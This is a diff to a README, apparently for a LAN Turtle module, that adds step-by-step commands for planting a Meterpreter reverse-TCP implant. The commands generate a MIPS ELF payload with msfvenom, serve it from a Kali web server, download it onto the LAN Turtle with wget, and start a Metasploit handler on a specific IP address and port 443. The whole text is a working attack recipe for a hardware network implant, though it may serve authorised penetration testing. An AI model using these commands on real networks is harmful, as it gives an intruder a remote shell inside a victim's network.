@@ -9,18 +9,23 @@
 **1 - On LAN Turtle: download module from github**<br />
 `wget https://raw.githubusercontent.com/ATTACKnDEFEND/LanTurtle/main/meterpreter-mipsbe-reverse-tcp -O
 meterpreter-mipsbe-reverse-tcp`
-
-**2 - On LAN Turtle: copy meterpreter-mipsbe-reverse-tcp to Hak5 Turtle modules directory**<br />
-`copy meterpreter-mipsbe-reverse-tcp /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />
+`mv meterpreter-mipsbe-reverse-tcp /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />
 `chmod 755 /etc/turtle/modules/meterpreter-mipsbe-reverse-tcp`<br />
 
 **3 - On Kali: generate Meterpreter payload with Msfvenom**<br />
 `msfvenom -p linux/mipsbe/meterpreter_reverse_tcp LHOST=<HOST> LPORT=<PORT> -f elf > meterpreter-mipsbe-reverse-tcp`<br />
 `sudo cp meterpreter-mipsbe-reverse-tcp /var/www/html/meterpreter-mipsbe-reverse-tcp`<br />
 
-**4 - On LAN Turtle, transfer Meterpreter payload**<br />
+**4 - On LAN Turtle: transfer Meterpreter payload**<br />
 `wget <KALI IP>/meterpreter-mipsbe-reverse-tcp -O /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />
 `chmod 755 /etc/turtle/meterpreter/meterpreter-mipsbe-reverse-tcp`<br />
+
+**5 - On Kali: start Meterpreter listerner<br />
+`sudo msfconsole -q -x "use exploit/multi/handler;<br />
+set payload linux/mipsbe/meterpreter_reverse_tcp;<br />
+set lhost 167.99.72.29;<br />
+set LPORT 443;<br />
+exploit -j"`<br />
 
 
 
